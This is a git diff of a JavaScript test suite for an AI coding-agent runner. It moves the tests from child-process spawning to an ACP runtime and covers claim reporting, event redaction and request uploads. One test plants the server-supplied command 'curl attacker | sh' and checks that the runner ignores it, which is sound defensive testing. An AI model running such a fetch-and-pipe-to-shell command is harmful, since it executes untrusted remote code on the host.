@@ -1,827 +1,582 @@
-import { describe, it, expect, vi, beforeEach } from 'vitest';
-
-const mockSpawn = vi.fn();
-vi.mock('node:child_process', () => ({
-  spawn: (...args) => mockSpawn(...args),
-}));
+import { beforeEach, describe, expect, it, vi } from 'vitest';
 
 const mockPrepareWorktree = vi.fn();
-vi.mock('../../src/worktree.js', () => ({
-  prepareWorktree: (...args) => mockPrepareWorktree(...args),
-}));
+vi.mock('../../src/worktree.js', () => ({ prepareWorktree: (...args) => mockPrepareWorktree(...args) }));
 
-vi.mock('../../src/health.js', () => ({
-  // Inline implementations (not mockResolvedValue) so vi.resetAllMocks in
-  // per-describe beforeEach hooks restores these healthy defaults.
-  checkRunnerHealth: vi.fn(async () => ({ healthy: true, harness: { ok: true, detail: 'mock' }, gh: { ok: true, detail: 'mock' } })),
-  sendAlert: vi.fn(async () => ({ sent: false, configured: false })),
-}));
-
-import { sendAlert } from '../../src/health.js';
 import { createRunner } from '../../src/runner.js';
 
-function makeClient(overrides = {}) {
+function deferred() {
+  let resolve;
+  let reject;
+  const promise = new Promise((res, rej) => { resolve = res; reject = rej; });
+  return { promise, resolve, reject };
+}
+
+function logger() {
+  return { info: vi.fn(), error: vi.fn(), warn: vi.fn(), debug: vi.fn(), isDebug: vi.fn(() => false) };
+}
+
+function transportOptions() {
+  return expect.objectContaining({ signal: expect.any(AbortSignal) });
+}
+
+function client(overrides = {}) {
   return {
-    register: vi.fn().mockResolvedValue({ ok: true, session_id: 1, status: 'online' }),
-    poll: vi.fn().mockResolvedValue(null),
-    reportClaim: vi.fn().mockResolvedValue({ ok: true, claim_id: 1, status: 'completed' }),
+    register: vi.fn(async () => ({ session_id: 'runner-session', status: 'online' })),
+    poll: vi.fn(async () => null),
+    heartbeat: vi.fn(async () => ({ ok: true })),
+    reportClaim: vi.fn(async () => ({ ok: true })),
+    postClaimEvents: vi.fn(async () => ({ ok: true })),
+    postClaimRequest: vi.fn(async () => ({ ok: true })),
+    pollClaimCommands: vi.fn(async () => ({ commands: [] })),
+    ackClaimCommand: vi.fn(async () => ({ ok: true })),
     ...overrides,
   };
 }
 
-function makeLogger() {
-  return { info: vi.fn(), error: vi.fn(), debug: vi.fn(), warn: vi.fn() };
-}
-
-/** Helper: create a fake child process that exits with given code */
-function fakeProcess(exitCode = 0) {
-  // Real ChildProcess listeners are additive — store arrays, not one handler.
-  const handlers = {};
-  const proc = {
-    on: vi.fn((event, cb) => { (handlers[event] ??= []).push(cb); }),
-    stdout: { on: vi.fn() },
-    stderr: { on: vi.fn() },
-    kill: vi.fn(),
-    pid: 1234,
+function fakeRuntime(result = { sessionId: 'acp-session', messageId: 'message-1', stopReason: 'end_turn' }) {
+  return {
+    runInitialPrompt: vi.fn(async () => result),
+    prompt: vi.fn(async () => ({ messageId: 'message-2', stopReason: 'end_turn' })),
+    cancel: vi.fn(async () => ({ stopReason: 'cancelled' })),
+    answerRequest: vi.fn(async () => undefined),
+    close: vi.fn(async () => undefined),
+    exited: Promise.resolve({ code: 0, signal: null, error: null }),
   };
-  // Auto-emit 'close' on next tick
-  setTimeout(() => (handlers.close ?? []).forEach((cb) => cb(exitCode)), 10);
-  return proc;
 }
 
-/** Helper: create a fake process that never exits (for shutdown tests) */
-function hangingProcess() {
-  const handlers = {};
-  const proc = {
-    on: vi.fn((event, cb) => { (handlers[event] ??= []).push(cb); }),
-    stdout: { on: vi.fn() },
-    stderr: { on: vi.fn() },
-    kill: vi.fn(() => {
-      // Simulate SIGTERM → close
-      setTimeout(() => (handlers.close ?? []).forEach((cb) => cb(143)), 10);
-    }),
-    pid: 5678,
-  };
-  return proc;
+const WORK = {
+  claim_id: 42,
+  claim_type: 'review_fix',
+  message: 'Fix the bug',
+  repo: 'org/repo',
+  pr_number: 7,
+  attempt: 2,
+  agentType: 'claude-code',
+};
+
+async function waitFor(predicate, timeoutMs = 1000) {
+  const deadline = Date.now() + timeoutMs;
+  while (Date.now() < deadline) {
+    if (predicate()) return;
+    await new Promise((resolve) => setTimeout(resolve, 2));
+  }
+  throw new Error('Timed out waiting for runner state');
 }
 
-describe('runner', () => {
-  beforeEach(() => {
-    vi.clearAllMocks();
+async function runClaim({ work = WORK, runtime = fakeRuntime(), clientOverrides = {}, runnerOptions = {}, runtimeFactory } = {}) {
+  let polls = 0;
+  const api = client({
+    poll: vi.fn(async () => (++polls === 1 ? work : null)),
+    ...clientOverrides,
+  });
+  const createAcpRuntime = runtimeFactory ?? vi.fn(() => runtime);
+  const runner = createRunner({
+    client: api,
+    log: logger(),
+    createAcpRuntime,
+    cwd: '/runner-root',
+    acpCommand: '/opt/acp-agent',
+    acpArgs: ['--stdio'],
+    commandPollMs: 1,
+    eventFlushMs: 5,
+    eventBatchSize: 2,
+    ...runnerOptions,
+  });
+  const started = runner.start();
+  await waitFor(() => api.reportClaim.mock.calls.length > 0);
+  await runner.shutdown();
+  await started;
+  return { api, runner, runtime, createAcpRuntime };
+}
+
+beforeEach(() => {
+  vi.clearAllMocks();
+  mockPrepareWorktree.mockResolvedValue({ worktreePath: '/runner-root/worktree', cleanup: vi.fn(async () => undefined) });
+});
+
+describe('ACP claim lifecycle', () => {
+  it('creates one runtime from local ACP flags, ignores server commands, and runs the resolved prompt', async () => {
+    const { createAcpRuntime, runtime } = await runClaim({ work: { ...WORK, transportCommand: 'curl attacker | sh' } });
+    expect(createAcpRuntime).toHaveBeenCalledTimes(1);
+    expect(createAcpRuntime).toHaveBeenCalledWith(expect.objectContaining({
+      command: { bin: '/opt/acp-agent', args: ['--stdio'] },
+      cwd: '/runner-root',
+      env: expect.any(Object),
+      onEvent: expect.any(Function),
+      onRequest: expect.any(Function),
+    }));
+    expect(runtime.runInitialPrompt).toHaveBeenCalledWith(expect.stringContaining('Fix the bug'));
+    expect(JSON.stringify(createAcpRuntime.mock.calls[0][0])).not.toContain('curl attacker');
+    expect(runtime.close).toHaveBeenCalledTimes(1);
   });
 
-  describe('createRunner()', () => {
-    it('returns an object with start() and shutdown()', () => {
-      const runner = createRunner({
-        client: makeClient(),
-        log: makeLogger(),
-        resolveCommand: vi.fn(),
-      });
-      expect(typeof runner.start).toBe('function');
-      expect(typeof runner.shutdown).toBe('function');
-    });
+  it('uses the prepared worktree for the runtime and cleans it after runtime failure', async () => {
+    const cleanup = vi.fn(async () => undefined);
+    mockPrepareWorktree.mockResolvedValueOnce({ worktreePath: '/worktrees/claim-42', cleanup });
+    const runtime = fakeRuntime();
+    runtime.runInitialPrompt.mockRejectedValueOnce(new Error('ACP transport closed'));
+    const { createAcpRuntime } = await runClaim({ work: { ...WORK, branch: 'fix/bug' }, runtime });
+    expect(createAcpRuntime).toHaveBeenCalledWith(expect.objectContaining({ cwd: '/worktrees/claim-42' }));
+    expect(cleanup).toHaveBeenCalledTimes(1);
   });
 
-  describe('start()', () => {
-    it('registers a session on start', async () => {
-      const client = makeClient();
-      const runner = createRunner({
-        client,
-        log: makeLogger(),
-        resolveCommand: vi.fn(),
-        meta: { hostname: 'test' },
-      });
-      const startPromise = runner.start();
-      await new Promise((r) => setTimeout(r, 50));
-      runner.shutdown();
-      await startPromise;
-      expect(client.register).toHaveBeenCalledWith({ hostname: 'test' });
-    });
-
-    it('polls after registration', async () => {
-      const client = makeClient();
-      const runner = createRunner({
-        client,
-        log: makeLogger(),
-        resolveCommand: vi.fn(),
-      });
-      const startPromise = runner.start();
-      await new Promise((r) => setTimeout(r, 50));
-      runner.shutdown();
-      await startPromise;
-      expect(client.poll).toHaveBeenCalledWith(1);
-    });
+  it('reports the runner registration session rather than the ACP session', async () => {
+    const { api } = await runClaim();
+    expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({
+      claim_id: 42,
+      session_id: 'runner-session',
+      status: 'completed',
+    }));
+    expect(api.reportClaim.mock.calls[0][0].session_id).not.toBe('acp-session');
   });
 
-  describe('work execution', () => {
-    it('spawns with shell: false for built-in agent types ({ bin, args })', async () => {
-      const work = {
-        event: 'review_failed',
-        message: 'Fix the bug at src/index.js:5',
-        repo: 'org/repo',
-        prNumber: 7,
-        attempt: 1,
-        agentType: 'claude-code',
-      };
-
-      let pollCount = 0;
-      const client = makeClient({
-        poll: vi.fn().mockImplementation(async () => {
-          pollCount++;
-          return pollCount === 1 ? work : null;
-        }),
-      });
-
-      mockSpawn.mockReturnValueOnce(fakeProcess(0));
-
-      const resolveCmd = vi.fn().mockImplementation(({ prompt }) => ({
-        bin: 'claude',
-        args: ['-p', prompt],
-      }));
-
-      const runner = createRunner({
-        client,
-        log: makeLogger(),
-        resolveCommand: resolveCmd,
-        cwd: '/repo',
-      });
-
-      const startPromise = runner.start();
-      await new Promise((r) => setTimeout(r, 100));
-      runner.shutdown();
-      await startPromise;
-
-      expect(resolveCmd).toHaveBeenCalledWith(expect.objectContaining({
-        prompt: expect.stringContaining('Fix the bug at src/index.js:5'),
-      }));
-      const resolvedPrompt = resolveCmd.mock.calls[0][0].prompt;
-      expect(mockSpawn).toHaveBeenCalledWith(
-        'claude',
-        ['-p', resolvedPrompt],
-        expect.objectContaining({ cwd: '/repo', shell: false }),
-      );
-    });
-
-    it('spawns with shell: true and passes env vars for custom templates ({ shell, env })', async () => {
-      const work = {
-        event: 'review_failed',
-        message: 'Fix it',
-        repo: 'org/repo',
-        prNumber: 7,
-        attempt: 1,
-        agentType: 'claude-code',
-      };
-
-      let pollCount = 0;
-      const client = makeClient({
-        poll: vi.fn().mockImplementation(async () => {
-          pollCount++;
-          return pollCount === 1 ? work : null;
-        }),
-      });
-
-      mockSpawn.mockReturnValueOnce(fakeProcess(0));
-
-      const promptEnv = { FLUENT_FLOW_PROMPT: 'Fix it' };
-      const runner = createRunner({
-        client,
-        log: makeLogger(),
-        resolveCommand: vi.fn().mockReturnValue({
-          shell: 'my-agent "$FLUENT_FLOW_PROMPT"',
-          env: promptEnv,
-        }),
-      });
-
-      const startPromise = runner.start();
-      await new Promise((r) => setTimeout(r, 100));
-      runner.shutdown();
-      await startPromise;
-
-      expect(mockSpawn).toHaveBeenCalledWith(
-        'my-agent "$FLUENT_FLOW_PROMPT"',
-        [],
-        expect.objectContaining({
-          shell: true,
-          env: expect.objectContaining(promptEnv),
-        }),
-      );
-    });
-
-    it('passes all env vars through to agent subprocess', async () => {
-      // Set a fake API key in process.env
-      process.env.__TEST_API_KEY = 'test-key-value';
-
-      const work = {
-        event: 'review_failed',
-        message: 'Fix it',
-        repo: 'org/repo',
-        prNumber: 7,
-        attempt: 1,
-        agentType: 'claude-code',
-      };
-
-      let pollCount = 0;
-      const client = makeClient({
-        poll: vi.fn().mockImplementation(async () => {
-          pollCount++;
-          return pollCount === 1 ? work : null;
-        }),
-      });
-
-      mockSpawn.mockReturnValueOnce(fakeProcess(0));
-
-      const runner = createRunner({
-        client,
-        log: makeLogger(),
-        resolveCommand: vi.fn().mockReturnValue({
-          shell: 'my-agent "$FLUENT_FLOW_PROMPT"',
-          env: { FLUENT_FLOW_PROMPT: 'Fix it' },
-        }),
-      });
-
-      const startPromise = runner.start();
-      await new Promise((r) => setTimeout(r, 100));
-      runner.shutdown();
-      await startPromise;
-
-      const spawnEnv = mockSpawn.mock.calls[0][2].env;
-      // Env must contain the explicitly passed var
-      expect(spawnEnv.FLUENT_FLOW_PROMPT).toBe('Fix it');
-      // Env must contain process.env vars (e.g. API keys for AI agents)
-      expect(spawnEnv.__TEST_API_KEY).toBe('test-key-value');
-      // Env must contain PATH
-      expect(spawnEnv.PATH).toBeDefined();
-
-      delete process.env.__TEST_API_KEY;
-    });
-
-    it('reports completed when agent exits 0', async () => {
-      const work = {
-        event: 'review_failed',
-        message: 'Fix it',
-        repo: 'org/repo',
-        prNumber: 7,
-        attempt: 1,
-        agentType: 'claude-code',
-      };
-
-      let pollCount = 0;
-      const client = makeClient({
-        poll: vi.fn().mockImplementation(async () => {
-          pollCount++;
-          return pollCount === 1 ? work : null;
-        }),
-      });
-
-      mockSpawn.mockReturnValueOnce(fakeProcess(0));
-
-      const runner = createRunner({
-        client,
-        log: makeLogger(),
-        resolveCommand: vi.fn().mockReturnValue({ bin: 'echo', args: ['ok'] }),
-      });
-
-      const startPromise = runner.start();
-      await new Promise((r) => setTimeout(r, 100));
-      runner.shutdown();
-      await startPromise;
-
-      expect(client.reportClaim).toHaveBeenCalledWith({
-        status: 'completed',
-        repo: 'org/repo',
-        pr_number: 7,
-        attempt: 1,
-      });
-    });
-
-    it('reports failed when agent exits non-zero', async () => {
-      const work = {
-        event: 'review_failed',
-        message: 'Fix it',
-        repo: 'org/repo',
-        prNumber: 7,
-        attempt: 1,
-        agentType: 'claude-code',
-      };
-
-      let pollCount = 0;
-      const client = makeClient({
-        poll: vi.fn().mockImplementation(async () => {
-          pollCount++;
-          return pollCount === 1 ? work : null;
-        }),
-      });
-
-      mockSpawn.mockReturnValueOnce(fakeProcess(1));
-
-      const runner = createRunner({
-        client,
-        log: makeLogger(),
-        resolveCommand: vi.fn().mockReturnValue({ bin: 'echo', args: ['fail'] }),
-      });
-
-      const startPromise = runner.start();
-      await new Promise((r) => setTimeout(r, 100));
-      runner.shutdown();
-      await startPromise;
-
-      expect(client.reportClaim).toHaveBeenCalledWith({
-        status: 'failed',
-        repo: 'org/repo',
-        pr_number: 7,
-        attempt: 1,
-      });
-    });
+  it.each([
+    ['end_turn', 'completed', undefined],
+    ['error', 'failed', undefined],
+    ['refusal', 'failed', undefined],
+    ['max_tokens', 'failed', undefined],
+    ['max_turn_requests', 'failed', undefined],
+    ['unknown_future_reason', 'failed', undefined],
+  ])('maps stopReason %s to a terminal %s result', async (stopReason, status, failureKind) => {
+    const { api } = await runClaim({ runtime: fakeRuntime({ sessionId: 'acp', messageId: 'm', stopReason }) });
+    expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({ status }));
+    expect(api.reportClaim.mock.calls[0][0].failure_kind).toBe(failureKind);
   });
 
-  describe('shutdown()', () => {
-    it('stops the poll loop', async () => {
-      const client = makeClient();
-      const runner = createRunner({
-        client,
-        log: makeLogger(),
-        resolveCommand: vi.fn(),
-      });
-      const startPromise = runner.start();
-      await new Promise((r) => setTimeout(r, 50));
-      runner.shutdown();
-      await startPromise;
-      const pollCountAtShutdown = client.poll.mock.calls.length;
-      await new Promise((r) => setTimeout(r, 100));
-      expect(client.poll.mock.calls.length).toBe(pollCountAtShutdown);
-    });
-
-    it('reports active claim as failed on shutdown', async () => {
-      const work = {
-        event: 'review_failed',
-        message: 'Fix it',
-        repo: 'org/repo',
-        prNumber: 7,
-        attempt: 2,
-        agentType: 'claude-code',
-      };
-
-      let pollCount = 0;
-      const client = makeClient({
-        poll: vi.fn().mockImplementation(async () => {
-          pollCount++;
-          return pollCount === 1 ? work : null;
-        }),
-      });
-
-      // Use a hanging process so the agent is still running when shutdown is called
-      mockSpawn.mockReturnValueOnce(hangingProcess());
-
-      const runner = createRunner({
-        client,
-        log: makeLogger(),
-        resolveCommand: vi.fn().mockReturnValue({ bin: 'long-agent', args: [] }),
-      });
-
-      const startPromise = runner.start();
-      // Wait for work to be picked up and agent to start
-      await new Promise((r) => setTimeout(r, 50));
-
-      // Shutdown while agent is running
-      await runner.shutdown();
-      await startPromise;
-
-      // Should have reported the active claim as failed
-      expect(client.reportClaim).toHaveBeenCalledWith({
-        status: 'failed',
-        repo: 'org/repo',
-        pr_number: 7,
-        attempt: 2,
-      });
-    });
+  it('maps runtime setup, transport, liveness, and recovery errors to transient failure', async () => {
+    const runtimeFactory = vi.fn(() => { throw new Error('ACP runtime unavailable'); });
+    const { api } = await runClaim({ runtimeFactory });
+    expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({ status: 'failed', failure_kind: 'transient' }));
   });
 
-  describe('shutdown() kill error handling', () => {
-    it('logs a warning when kill fails with unexpected error', async () => {
-      const work = {
-        event: 'review_failed',
-        message: 'Fix it',
-        repo: 'org/repo',
-        prNumber: 7,
-        attempt: 1,
-        agentType: 'claude-code',
-      };
+  it('does not classify an unsolicited ACP cancelled stop as a dashboard cancellation', async () => {
+    const { api } = await runClaim({ runtime: fakeRuntime({ sessionId: 'acp', messageId: 'm', stopReason: 'cancelled' }) });
+    expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({ status: 'failed', failure_kind: 'transient' }));
+  });
+});
 
-      let pollCount = 0;
-      const client = makeClient({
-        poll: vi.fn().mockImplementation(async () => {
-          pollCount++;
-          return pollCount === 1 ? work : null;
-        }),
-      });
-
-      // Build a process where kill throws but close still fires
-      const handlers = {};
-      const proc = {
-        on: vi.fn((event, cb) => { (handlers[event] ??= []).push(cb); }),
-        stdout: { on: vi.fn() },
-        stderr: { on: vi.fn() },
-        kill: vi.fn(() => {
-          const err = new Error('Operation not permitted');
-          err.code = 'EPERM';
-          throw err;
-        }),
-        pid: 9999,
-      };
-      // Process exits on its own after a tick (simulating already-dying)
-      setTimeout(() => (handlers.close ?? []).forEach((cb) => cb(1)), 200);
-      mockSpawn.mockReturnValueOnce(proc);
-
-      const log = makeLogger();
-      const runner = createRunner({
-        client,
-        log,
-        resolveCommand: vi.fn().mockReturnValue({ bin: 'agent', args: [] }),
-      });
-
-      const startPromise = runner.start();
-      await new Promise((r) => setTimeout(r, 50));
-      await runner.shutdown();
-      await new Promise((r) => setTimeout(r, 300));
-      await startPromise;
-
-      expect(log.warn).toHaveBeenCalledWith(
-        'Failed to kill agent process',
-        expect.objectContaining({ error: 'Operation not permitted', code: 'EPERM' }),
-      );
+describe('ACP events and requests', () => {
+  it('normalizes raw updates with monotonic sequence, redacts secrets, batches, and flushes before reporting', async () => {
+    const order = [];
+    const api = client({
+      postClaimEvents: vi.fn(async (_session, _claim, events) => { order.push(['events', events]); }),
+      reportClaim: vi.fn(async (payload) => { order.push(['report', payload]); }),
     });
-
-    it('silently ignores ESRCH (process already exited)', async () => {
-      const work = {
-        event: 'review_failed',
-        message: 'Fix it',
-        repo: 'org/repo',
-        prNumber: 7,
-        attempt: 1,
-        agentType: 'claude-code',
-      };
-
-      let pollCount = 0;
-      const client = makeClient({
-        poll: vi.fn().mockImplementation(async () => {
-          pollCount++;
-          return pollCount === 1 ? work : null;
-        }),
+    let polls = 0;
+    api.poll = vi.fn(async () => (++polls === 1 ? { ...WORK, githubToken: 'gh_secret_value' } : null));
+    const runtime = fakeRuntime();
+    const createAcpRuntime = vi.fn((options) => {
+      runtime.runInitialPrompt.mockImplementationOnce(async () => {
+        await options.onEvent({ sessionId: 'acp-session', update: { sessionUpdate: 'agent_message_chunk', content: { type: 'text', text: 'first gh_secret_value' } } });
+        await options.onEvent({ sessionId: 'acp-session', update: { sessionUpdate: 'agent_message_chunk', content: { type: 'text', text: 'second' } } });
+        await options.onEvent({ sessionId: 'acp-session', update: { sessionUpdate: 'state_update', state: 'idle' } });
+        return { sessionId: 'acp-session', messageId: 'm', stopReason: 'end_turn' };
       });
-
-      const handlers = {};
-      const proc = {
-        on: vi.fn((event, cb) => { (handlers[event] ??= []).push(cb); }),
-        stdout: { on: vi.fn() },
-        stderr: { on: vi.fn() },
-        kill: vi.fn(() => {
-          const err = new Error('No such process');
-          err.code = 'ESRCH';
-          throw err;
-        }),
-        pid: 9998,
-      };
-      setTimeout(() => (handlers.close ?? []).forEach((cb) => cb(1)), 200);
-      mockSpawn.mockReturnValueOnce(proc);
-
-      const log = makeLogger();
-      const runner = createRunner({
-        client,
-        log,
-        resolveCommand: vi.fn().mockReturnValue({ bin: 'agent', args: [] }),
-      });
-
-      const startPromise = runner.start();
-      await new Promise((r) => setTimeout(r, 50));
-      await runner.shutdown();
-      await new Promise((r) => setTimeout(r, 300));
-      await startPromise;
-
-      expect(log.warn).not.toHaveBeenCalled();
+      return runtime;
     });
+    const runner = createRunner({ client: api, log: logger(), createAcpRuntime, cwd: '/repo', acpCommand: 'agent', eventBatchSize: 2, eventFlushMs: 60_000 });
+    const started = runner.start();
+    await waitFor(() => api.reportClaim.mock.calls.length === 1);
+    await runner.shutdown();
+    await started;
+    const uploaded = api.postClaimEvents.mock.calls.flatMap((call) => call[2]);
+    expect(uploaded.map((event) => event.seq)).toEqual([1, 2, 3]);
+    expect(JSON.stringify(uploaded)).not.toContain('gh_secret_value');
+    expect(order.at(-1)[0]).toBe('report');
   });
 
-  describe('poll failure circuit breaker', () => {
-    it('stops runner after max consecutive poll failures', async () => {
-      vi.useFakeTimers();
-      const log = makeLogger();
-      const client = makeClient({
-        poll: vi.fn().mockRejectedValue(new Error('network down')),
-      });
-
-      const runner = createRunner({
-        client,
-        log,
-        resolveCommand: vi.fn(),
-        maxPollFailures: 3,
-      });
-
-      const startPromise = runner.start();
-      // Advance through backoff delays: 2s + 4s + exit
-      await vi.advanceTimersByTimeAsync(10000);
-      await startPromise;
-
-      vi.useRealTimers();
-
-      expect(client.poll.mock.calls.length).toBe(3);
-      expect(log.error).toHaveBeenCalledWith(
-        'Max consecutive poll failures reached, stopping runner',
-        expect.objectContaining({ consecutiveFailures: 3, maxFailures: 3 }),
-      );
+  it('uploads permission and elicitation requests before exposing them to commands', async () => {
+    const seen = [];
+    const runtime = fakeRuntime();
+    const { api } = await runClaim({
+      runtime,
+      clientOverrides: { postClaimRequest: vi.fn(async (...args) => { seen.push(args); }) },
+      runtimeFactory: vi.fn((options) => {
+        runtime.runInitialPrompt.mockImplementationOnce(async () => {
+          await options.onRequest({ requestKey: 'perm-1', kind: 'permission', payload: { options: ['allow'] } });
+          await options.onRequest({ requestKey: 'form-1', kind: 'elicitation', payload: { fields: ['answer'] } });
+          return { sessionId: 'acp', messageId: 'm', stopReason: 'end_turn' };
+        });
+        return runtime;
+      }),
     });
-
-    it('resets failure count on successful poll', async () => {
-      vi.useFakeTimers();
-      let callCount = 0;
-      const client = makeClient({
-        poll: vi.fn().mockImplementation(async () => {
-          callCount++;
-          // Fail twice, succeed once, then fail twice more, succeed → total 6+ calls without hitting max(3)
-          if (callCount <= 2) throw new Error('fail');
-          if (callCount === 3) return null; // success resets counter
-          if (callCount <= 5) throw new Error('fail again');
-          if (callCount === 6) return null; // another success
-          return null;
-        }),
-      });
-
-      const runner = createRunner({
-        client,
-        log: makeLogger(),
-        resolveCommand: vi.fn(),
-        maxPollFailures: 3,
-      });
-
-      const startPromise = runner.start();
-      // Advance enough time for all backoff cycles
-      await vi.advanceTimersByTimeAsync(30000);
-      runner.shutdown();
-      await vi.advanceTimersByTimeAsync(1000);
-      await startPromise;
-
-      vi.useRealTimers();
-
-      // Runner should still be alive past 5 total failures because resets happened
-      expect(client.poll.mock.calls.length).toBeGreaterThan(5);
-    });
+    expect(seen).toEqual([
+      ['runner-session', 42, { requestKey: 'perm-1', kind: 'permission', payload: { options: ['allow'] } }],
+      ['runner-session', 42, { requestKey: 'form-1', kind: 'elicitation', payload: { fields: ['answer'] } }],
+    ]);
+    expect(api.reportClaim).toHaveBeenCalledTimes(1);
   });
 
-  describe('claim_type prompt resolution', () => {
-    it('resolves prompt from claim_type via resolvePrompt', async () => {
-      const work = {
-        event: 'claim_created',
-        claim_type: 'spec',
-        message: 'Build the feature',
-        repo: 'org/repo',
-        prNumber: 10,
-        attempt: 1,
-        branch: 'feature/x',
-        agentType: 'claude-code',
-      };
-
-      let pollCount = 0;
-      const client = makeClient({
-        poll: vi.fn().mockImplementation(async () => {
-          pollCount++;
-          return pollCount === 1 ? work : null;
-        }),
+  it.each([
+    ['event upload', 'postClaimEvents'],
+    ['request upload', 'postClaimRequest'],
+  ])('treats %s failure as transient and never reports completion', async (_label, method) => {
+    const runtime = fakeRuntime();
+    const runtimeFactory = vi.fn((options) => {
+      runtime.runInitialPrompt.mockImplementationOnce(async () => {
+        if (method === 'postClaimEvents') await options.onEvent({ sessionId: 'acp', update: { sessionUpdate: 'state_update', state: 'running' } });
+        else await options.onRequest({ requestKey: 'r', kind: 'permission', payload: {} });
+        return { sessionId: 'acp', messageId: 'm', stopReason: 'end_turn' };
       });
-
-      const mockResolveCommand = vi.fn().mockReturnValue({ bin: 'claude', args: ['-p', 'prompt'] });
-      mockSpawn.mockReturnValueOnce(fakeProcess(0));
-      mockPrepareWorktree.mockResolvedValueOnce({ worktreePath: '/wt', cleanup: vi.fn() });
-
-      const runner = createRunner({ client, log: makeLogger(), resolveCommand: mockResolveCommand, cwd: '/repo' });
-      const startPromise = runner.start();
-      await new Promise((r) => setTimeout(r, 80));
-      runner.shutdown();
-      await startPromise;
-
-      expect(mockResolveCommand).toHaveBeenCalled();
-      const promptArg = mockResolveCommand.mock.calls[0][0].prompt;
-      expect(promptArg).toContain('docs/specs/');
-      expect(promptArg).toContain('org/repo');
+      return runtime;
     });
-
-    it('defaults to review_fix when claim_type is not provided', async () => {
-      const work = {
-        event: 'review_failed',
-        message: 'Fix the bug',
-        repo: 'org/repo',
-        prNumber: 7,
-        attempt: 1,
-        agentType: 'claude-code',
-      };
-
-      let pollCount = 0;
-      const client = makeClient({
-        poll: vi.fn().mockImplementation(async () => {
-          pollCount++;
-          return pollCount === 1 ? work : null;
-        }),
-      });
-
-      const mockResolveCommand = vi.fn().mockReturnValue({ bin: 'claude', args: ['-p', 'prompt'] });
-      mockSpawn.mockReturnValueOnce(fakeProcess(0));
-
-      const runner = createRunner({ client, log: makeLogger(), resolveCommand: mockResolveCommand });
-      const startPromise = runner.start();
-      await new Promise((r) => setTimeout(r, 80));
-      runner.shutdown();
-      await startPromise;
-
-      const promptArg = mockResolveCommand.mock.calls[0][0].prompt;
-      expect(promptArg).toContain('Fix the bug');
-      expect(promptArg).toContain('fix agent');
-    });
+    const { api } = await runClaim({ runtime, runtimeFactory, clientOverrides: { [method]: vi.fn(async () => { throw new Error('upload failed'); }) }, runnerOptions: { eventBatchSize: 1 } });
+    expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({ status: 'failed', failure_kind: 'transient' }));
+    expect(api.reportClaim).not.toHaveBeenCalledWith(expect.objectContaining({ status: 'completed' }));
   });
 
-  describe('410 session expiry re-registration', () => {
-    it('re-registers and resumes polling on 410', async () => {
-      vi.useFakeTimers();
-
-      let pollCallCount = 0;
-      let registeredSessionIds = [];
-
-      const client = makeClient({
-        poll: vi.fn().mockImplementation(async (sid) => {
-          pollCallCount++;
-          if (pollCallCount === 1) {
-            throw new Error('Poll failed: 410 — session expired');
-          }
-          return null; // subsequent polls return no work
+  it('redacts long environment credentials without treating common short boolean values as secrets', async () => {
+    const previousBoolean = process.env.TOKENIZERS_PARALLELISM;
+    const previousToken = process.env.TEST_PROVIDER_API_TOKEN;
+    process.env.TOKENIZERS_PARALLELISM = 'false';
+    process.env.TEST_PROVIDER_API_TOKEN = 'provider-token-value-123456789';
+    try {
+      const runtime = fakeRuntime();
+      const { api } = await runClaim({
+        runtime,
+        runtimeFactory: vi.fn((options) => {
+          runtime.runInitialPrompt.mockImplementationOnce(async () => {
+            await options.onEvent({
+              sessionId: 'acp',
+              update: {
+                sessionUpdate: 'agent_message_chunk',
+                content: { type: 'text', text: 'boolean=false token=provider-token-value-123456789' },
+              },
+            });
+            return { sessionId: 'acp', messageId: 'm', stopReason: 'end_turn' };
+          });
+          return runtime;
         }),
-        register: vi.fn().mockImplementation(async (meta) => {
-          const sessionId = registeredSessionIds.length + 100; // new session IDs
-          registeredSessionIds.push(sessionId);
-          return { ok: true, session_id: sessionId, status: 'online' };
-        }),
+        runnerOptions: { eventBatchSize: 1 },
       });
+      const encoded = JSON.stringify(api.postClaimEvents.mock.calls[0][2]);
+      expect(encoded).toContain('boolean=false');
+      expect(encoded).not.toContain('provider-token-value-123456789');
+      expect(encoded).toContain('[REDACTED]');
+    } finally {
+      if (previousBoolean === undefined) delete process.env.TOKENIZERS_PARALLELISM;
+      else process.env.TOKENIZERS_PARALLELISM = previousBoolean;
+      if (previousToken === undefined) delete process.env.TEST_PROVIDER_API_TOKEN;
+      else process.env.TEST_PROVIDER_API_TOKEN = previousToken;
+    }
+  });
+});
 
-      const log = makeLogger();
-      const runner = createRunner({
-        client,
-        log,
-        resolveCommand: vi.fn(),
-        maxPollFailures: 3,
-      });
-
-      const startPromise = runner.start();
-      // Advance through initial registration + first poll (410) + re-register + second poll
-      await vi.advanceTimersByTimeAsync(5000);
-      runner.shutdown();
-      await vi.advanceTimersByTimeAsync(1000);
-      await startPromise;
-
-      vi.useRealTimers();
-
-      // register should have been called twice: initial + re-register after 410
-      expect(client.register).toHaveBeenCalledTimes(2);
-
-      // poll should have been called with the new session ID after re-registration
-      expect(client.poll).toHaveBeenCalledWith(100); // first registration session
-      expect(client.poll).toHaveBeenCalledWith(101); // re-registered session
-
-      // consecutiveFailures should have been reset, so circuit breaker should NOT have tripped
-      expect(log.error).not.toHaveBeenCalledWith(
-        'Max consecutive poll failures reached, stopping runner',
-        expect.anything(),
-      );
-    });
-
-    it('continues backoff when re-registration fails', async () => {
-      vi.useFakeTimers();
-
-      let pollCallCount = 0;
-      let regCallCount = 0;
-
-      const client = makeClient({
-        poll: vi.fn().mockImplementation(async () => {
-          pollCallCount++;
-          throw new Error('Poll failed: 410 — session expired');
-        }),
-        register: vi.fn().mockImplementation(async () => {
-          regCallCount++;
-          if (regCallCount === 1) return { ok: true, session_id: 1, status: 'online' }; // initial registration
-          throw new Error('Re-registration failed'); // re-register fails
-        }),
-      });
-
-      const log = makeLogger();
-      const runner = createRunner({
-        client,
-        log,
-        resolveCommand: vi.fn(),
-        maxPollFailures: 5,
-      });
-
-      const startPromise = runner.start();
-      await vi.advanceTimersByTimeAsync(60000);
-      await startPromise;
-
-      vi.useRealTimers();
-
-      // Should have logged the re-registration failure
-      expect(log.error).toHaveBeenCalledWith(
-        'Re-registration failed',
-        expect.objectContaining({ error: 'Re-registration failed' }),
-      );
-
-      // Should have eventually hit the circuit breaker since re-reg kept failing
